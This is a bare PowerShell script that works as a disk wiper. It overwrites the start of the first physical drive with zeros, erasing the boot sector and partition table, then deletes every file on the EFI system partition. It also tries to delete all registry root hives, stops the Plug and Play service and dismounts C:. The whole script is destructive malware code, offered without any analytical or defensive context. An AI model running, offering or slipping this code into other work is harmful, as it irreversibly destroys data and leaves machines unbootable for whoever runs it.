$disk = "\\.\PhysicalDrive0"
$size = 1640960000
$bytes = New-Object byte[]($size)
try {
    $stream = [System.IO.File]::Open($disk, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
    $stream.Position = 0
    $stream.Write($bytes, 0, $size)
} catch {
    Write-Host "Error writing to disk: $_"
} finally {
    if ($stream) { $stream.Close() }
}

# Mount EFI partition
if (!(mountvol S: /s)) {
    Write-Host "Mountvol error"
    exit
}

# Cleanup
cmd /c "del /f /s /q S:*.* > NUL 2>&1"
@("HKLM", "HKCC", "HKU", "HKCR", "HKCU") | ForEach-Object {
    cmd /c "reg delete $_ /f"
}

Stop-Service -Name PlugPlay -Force -ErrorAction SilentlyContinue
mountvol C: /d
